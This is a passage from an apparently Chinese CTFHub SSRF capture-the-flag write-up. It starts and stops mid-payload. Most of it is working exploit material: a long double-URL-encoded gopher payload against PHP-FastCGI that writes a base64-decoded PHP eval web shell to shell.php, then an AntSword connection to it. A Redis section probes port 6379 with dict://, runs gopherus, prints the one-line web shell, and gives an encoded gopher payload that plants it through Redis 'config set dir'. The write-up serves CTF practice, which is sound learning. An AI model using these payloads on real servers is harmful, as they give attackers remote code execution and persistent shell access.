class="hljs-keyword">c</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%39</span><span class="hljs-variable">%52</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%4</span>f<span class="hljs-variable">%54</span><span class="hljs-variable">%45</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%41</span><span class="hljs-variable">%44</span><span class="hljs-variable">%44</span><span class="hljs-variable">%52</span><span class="hljs-variable">%31</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%38</span><span class="hljs-variable">%53</span><span class="hljs-variable">%45</span><span class="hljs-variable">%52</span><span class="hljs-variable">%56</span><span class="hljs-variable">%45</span><span class="hljs-variable">%52</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%50</span><span class="hljs-variable">%52</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%54</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%48</span><span class="hljs-variable">%54</span><span class="hljs-variable">%54</span><span class="hljs-variable">%50</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%31</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%33</span><span class="hljs-variable">%43</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%4</span>e<span class="hljs-variable">%54</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%47</span><span class="hljs-variable">%54</span><span class="hljs-variable">%48</span><span class="hljs-variable">%31</span><span class="hljs-variable">%32</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%34</span><span class="hljs-variable">%52</span><span class="hljs-variable">%45</span><span class="hljs-variable">%51</span><span class="hljs-variable">%55</span><span class="hljs-variable">%45</span><span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%4</span>d<span class="hljs-variable">%45</span><span class="hljs-variable">%54</span><span class="hljs-variable">%48</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%44</span><span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%39</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%50</span><span class="hljs-variable">%48</span><span class="hljs-variable">%50</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%56</span><span class="hljs-variable">%41</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%55</span><span class="hljs-variable">%45</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%75</span><span class="hljs-variable">%72</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%61</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%75</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%73</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%61</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%5</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%72</span><span class="hljs-variable">%65</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%31</span><span class="hljs-variable">%37</span><span class="hljs-variable">%53</span><span class="hljs-variable">%43</span><span class="hljs-variable">%52</span><span class="hljs-variable">%49</span><span class="hljs-variable">%50</span><span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%46</span><span class="hljs-variable">%49</span><span class="hljs-variable">%4</span><span class="hljs-keyword">c</span><span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%41</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%45</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%44</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%55</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%45</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%54</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%52</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%4</span>f<span class="hljs-variable">%54</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%35</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%43</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%73</span><span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%68</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%50</span><span class="hljs-variable">%44</span><span class="hljs-variable">%39</span><span class="hljs-variable">%77</span><span class="hljs-variable">%61</span><span class="hljs-variable">%48</span><span class="hljs-variable">%41</span><span class="hljs-variable">%67</span><span class="hljs-variable">%51</span><span class="hljs-variable">%47</span><span class="hljs-variable">%56</span><span class="hljs-variable">%32</span><span class="hljs-variable">%59</span><span class="hljs-variable">%57</span><span class="hljs-variable">%77</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%4</span>a<span class="hljs-variable">%46</span><span class="hljs-variable">%39</span><span class="hljs-variable">%51</span><span class="hljs-variable">%54</span><span class="hljs-variable">%31</span><span class="hljs-variable">%4</span>e<span class="hljs-variable">%55</span><span class="hljs-variable">%57</span><span class="hljs-variable">%79</span><span class="hljs-variable">%64</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%62</span><span class="hljs-variable">%57</span><span class="hljs-variable">%51</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%58</span><span class="hljs-variable">%53</span><span class="hljs-variable">%6</span>b<span class="hljs-variable">%37</span><span class="hljs-variable">%50</span><span class="hljs-variable">%7</span>a<span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%32</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%37</span><span class="hljs-variable">%43</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%62</span><span class="hljs-variable">%61</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%36</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%65</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%42</span><span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%65</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%4</span>d<span class="hljs-variable">%61</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%62</span><span class="hljs-variable">%79</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%53</span><span class="hljs-variable">%70</span><span class="hljs-variable">%79</span><span class="hljs-variable">%44</span><span class="hljs-variable">%33</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%2</span>d<span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%30</span><br></code></pre></td></tr></table></figure><p>我们在终端执行的命令是：给base64编码的一句话木马解码并写在shell.php中。</p><p>所以我们用蚁剑去连接</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">http://challenge-<span class="hljs-number">064</span>b2e19860ea6b7.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/<span class="hljs-keyword">shell</span>.php<br></code></pre></td></tr></table></figure><p>连接密码我们设置的是cmd</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950641.png"></p><p>Flag文件是在根目录下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950496.png"></p><p>出flag</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950629.png"></p><h2 id="Redis协议"><a href="#Redis协议" class="headerlink" title="Redis协议"></a>Redis协议</h2><p>这里说是redis协议，用dict协议试试6379端口</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>challenge-c4a4ebf619043f53.sandbox.ctfhub.com:<span class="hljs-number">10800</span><span class="hljs-regexp">/?url=dict:/</span><span class="hljs-regexp">/127.0.0.1:6379/i</span>nfo<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950312.png"></p><p>上面那张图不太好看，右键查看源代码看一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021950923.png"></p><p>如果探测到6379端口，那么可以利用http、gopher、dict这几个协议来打开放6379端口的redis服务（一般开放了这个端口的是redis服务，可以查一下dict:&#x2F;&#x2F;127.0.0.1:6379&#x2F;info），原理是利用他们以目标机的身份执行对开启redis服务的内网机执行redis命令，执行我们想要的操作</p><p>这里我们还是用gopherus构造payload。</p><p>这里我们启动gopherus，攻击redis，</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">./gopherus.py</span> <span class="hljs-params">--exploit</span> redis<br></code></pre></td></tr></table></figure><p>选择phpshell，默认路径（回车跳过就行），</p><p>这里payload一定我们自己写（gopherus默认是get型的，还不一定好使）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951171.png"></p><p>复制payload，在bp里再来一次URL编码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021951709.png"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">gopher:</span>//<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6379</span>/_<span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%75</span><span class="hljs-variable">%73</span><span class="hljs-variable">%68</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%31</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%43</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%70</span><span class="hljs-variable">%68</span><span class="hljs-variable">%70</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%30</span><span class="hljs-variable">%25</span><span class="hljs-variable">%34</span><span class="hljs-variable">%30</span><span class="hljs-variable">%65</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%38</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%50</span><span class="hljs-variable">%4</span>f<span class="hljs-variable">%53</span><span class="hljs-variable">%54</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%64</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%37</span><span class="hljs-variable">%25</span><span class="hljs-variable">%35</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%39</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%42</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%46</span><span class="hljs-variable">%25</span><span class="hljs-variable">%33</span><span class="hljs-variable">%45</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%64</span><span class="hljs-variable">%69</span><span class="hljs-variable">%72</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%31</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%77</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%68</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%41</span><span class="hljs-variable">%34</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%36</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%66</span><span class="hljs-variable">%69</span><span class="hljs-variable">%67</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span class="hljs-variable">%33</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%74</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%44</span><span class="hljs-variable">%25</span><span class="hljs-variable">%30</span><span class="hljs-variable">%41</span><span class="hljs-variable">%25</span><span class="hljs-variable">%32</span><span class="hljs-variable">%34</span><span 